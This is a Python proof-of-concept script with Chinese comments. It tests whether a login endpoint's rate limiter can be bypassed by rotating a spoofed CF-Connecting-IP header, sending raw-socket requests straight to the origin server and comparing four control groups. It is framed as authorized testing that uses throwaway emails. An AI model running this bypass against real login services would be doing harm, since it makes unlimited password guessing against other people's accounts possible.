#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
cfip_realip_login_ratelimit_bypass.py
---------------------------------------------------
判定「登录接口的限流桶是按 realip 后的客户端 IP 分的，而 realip 取自可伪造的
CF-Connecting-IP」——即：轮换该头 = 无限次登录尝试。

四组对照必须全部成立才下结论（单发一次通过不算数）:
  A 基线      : 不带任何转发头，背靠背 N 发          -> 第 2 发起应 429
  B 轮换CFIP  : 每发不同 CF-Connecting-IP           -> 应全部 401（不通限流）
  C 固定CFIP  : 固定一个全新 CF-Connecting-IP 连发   -> 前几发通过后转 429
  D 其它头    : 轮换 XFF / X-Real-IP / True-Client-IP / X-Client-IP / Forwarded
                                                     -> 应与基线同量级（不被采信）

用法:
  # 源站直连（推荐；走 CDN 时 CDN 会覆写 CF-Connecting-IP，本手法失效）
  python cfip_realip_login_ratelimit_bypass.py --host TARGET.TLD --ip 1.2.3.4 --port 443
  # 无 CDN 直接跑
  python cfip_realip_login_ratelimit_bypass.py --host TARGET.TLD --port 80 --scheme http

要点:
  * 一律裸 socket + ssl，绕开本机 HTTP 代理（requests/curl 走代理会把源 IP 换掉）。
  * 邮箱必须用不存在的一次性地址，避免把真实账号打进锁定。
  * 每组之间 sleep 一个限流窗口（--cooldown，默认 65s），否则桶互相污染。
  * 只适合授权测试；别对生产做长时间高速爆破。
"""
import argparse
import json
import random
import socket
import ssl
import sys
import time

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")


def build(host, ip, port, scheme, path, extra_headers, email, password, timeout):
    body = json.dumps({"email": email, "password": password}).encode()
    hdrs = [
        "POST %s HTTP/1.1" % path,
        "Host: %s" % host,
        "User-Agent: " + UA,
        "Accept: application/json, text/plain, */*",
        "Content-Type: application/json",
        "Content-Length: %d" % len(body),
        "Connection: close",
    ]
    for k, v in (extra_headers or {}).items():
        hdrs.append("%s: %s" % (k, v))
    return ("\r\n".join(hdrs) + "\r\n\r\n").encode() + body


def send(host, ip, port, scheme, path, extra_headers, email, password, timeout=15):
    raw = build(host, ip, port, scheme, path, extra_headers, email, password, timeout)
    if scheme == "https":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = socket.create_connection((ip, port), timeout=timeout)
        sock = ctx.wrap_socket(sock, server_hostname=host)   # SNI 必须是域名
    else:
        sock = socket.create_connection((ip, port), timeout=timeout)
    try:
        sock.sendall(raw)
        buf = b""
        while True:
            chunk = sock.recv(65536)
            if not chunk:
                break
            buf += chunk
    finally:
        sock.close()
    head, _, bod = buf.partition(b"\r\n\r\n")
    try:
        status = int(head.split(b" ")[1])
    except Exception:
        status = 0
    snippet = bod[:70].replace(b"\r\n", b" ").decode("utf-8", "replace")
    return status, len(bod), snippet


def kv(headers):
    return ", ".join("%s=%s" % (k, v) for k, v in headers.items()) or "(none)"


def run_group(name, n, headers_fn, args, base_email):
    out = []
    for i in range(n):
        h = headers_fn(i)
        email = "nobody-%s%d@example.com" % (base_email, i)
        try:
            st, ln, sn = send(args.host, args.ip, args.port, args.scheme,
                              args.path, h, email, args.password, args.timeout)
        except Exception as e:                       # noqa: BLE001
            st, ln, sn = -1, 0, "EXC:%s" % e
        out.append((st, ln, kv(h) if h else "", sn))
        print("  [%02d] http=%-4s len=%-5s %-52s %s" % (i + 1, st, ln, kv(h) if h else "(none)", sn))
    passed = sum(1 for st, *_ in out if st not in (429, -1))
    limited = sum(1 for st, *_ in out if st == 429)
    print("  => %s: pass=%d/%d limited=%d" % (name, passed, n, limited))
    return passed, limited


def rand_ip():
    return "198.25.%d.%d" % (random.randint(1, 254), random.randint(1, 254))


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", required=True, help="SNI/Host，例 target.tld")
    ap.add_argument("--ip", default=None, help="源站 IP；省略则用系统解析")
    ap.add_argument("--port", type=int, default=443)
    ap.add_argument("--scheme", default="https", choices=["http", "https"])
    ap.add_argument("--path", default="/api/v1/auth/login")
    ap.add_argument("--password", default="Wrong#Pass123")
    ap.add_argument("--n", type=int, default=5, help="每组请求数")
    ap.add_argument("--cooldown", type=int, default=65, help="组间冷却秒数")
    ap.add_argument("--timeout", type=int, default=15)
    args = ap.parse_args()

    if not args.ip:
        args.ip = socket.getaddrinfo(args.host, args.port,
                                     proto=socket.IPPROTO_TCP)[0][4][0]
        print("[*] 未指定 --ip，解析得 %s（若目标在 CDN 后，这里拿到的是 CDN IP，"
              "CF-Connecting-IP 会被 CDN 覆写，本手法失效）" % args.ip)

    print("[*] target=%s://%s:%d%s" % (args.scheme, args.ip, args.port, args.path))
    print("[*] SNI/Host=%s  n=%d  cooldown=%ds\n" % (args.host, args.n, args.cooldown))

    tag = "%d" % random.randint(10, 99)

    print("== A 基线：不带转发头（证明限流确实在）")
    pa, la = run_group("baseline", args.n, lambda i: None, args, "a" + tag)

    time.sleep(args.cooldown)

    print("\n== B 轮换 CF-Connecting-IP（证明该头就是限流键）")
    pb, lb = run_group("rotate CF-Connecting-IP", args.n,
                       lambda i: {"CF-Connecting-IP": rand_ip()}, args, "b" + tag)

    time.sleep(args.cooldown)

    print("\n== C 固定同一个 CF-Connecting-IP（排除『只要带头就不限流』）")
    fixed = rand_ip()
    pc, lc = run_group("fixed CF-Connecting-IP=%s" % fixed, args.n,
                       lambda i: {"CF-Connecting-IP": fixed}, args, "c" + tag)

    time.sleep(args.cooldown)

    print("\n== D 轮换其它转发头（应 == 基线噪声，即不被 realip 采信）")
    other_headers = ["X-Forwarded-For", "X-Real-IP", "True-Client-IP",
                     "X-Client-IP", "Forwarded"]
    results = {}
    for hd in other_headers:
        def mk(hd=hd):
            def f(i):
                if hd == "Forwarded":
                    return {hd: "for=%s;proto=https" % rand_ip()}
                return {hd: rand_ip()}
            return f
        p, l = run_group("rotate " + hd, args.n, mk(), args, "d" + tag + hd[:3])
        results[hd] = (p, l)
        time.sleep(max(5, args.cooldown // 2))

    print("\n" + "=" * 72)
    print("结论矩阵")
    print("  A baseline                 pass=%d/%d limited=%d  (期望 1~2 通过后 429)" % (pa, args.n, la))
    print("  B rotate CF-Connecting-IP  pass=%d/%d limited=%d  (期望 全通过)" % (pb, args.n, lb))
    print("  C fixed  CF-Connecting-IP  pass=%d/%d limited=%d  (期望 与 A 同量级)" % (pc, args.n, lc))
    for hd, (p, l) in results.items():
        print("  D rotate %-16s pass=%d/%d limited=%d  (期望 与 A 同量级)" % (hd, p, args.n, l))

    ok_a = la > 0
    ok_b = lb == 0 and pb == args.n
    ok_c = lc > 0
    ok_d = all(l > 0 for _p, l in results.values())
    verdict = ok_a and ok_b and ok_c and ok_d
    print("\nVERDICT: %s" % ("HIT — 限流桶按 realip(CF-Connecting-IP) 分，轮换即无限尝试"
                             if verdict else "NOT PROVEN — 逐条核对 A/B/C/D 哪一条不成立"))
    print("提醒: 本手法只放大 IP 配额；若目标另有账号级锁定/验证码，仍会被卡住。")
    return 0 if verdict else 1


if __name__ == "__main__":
    sys.exit(main())
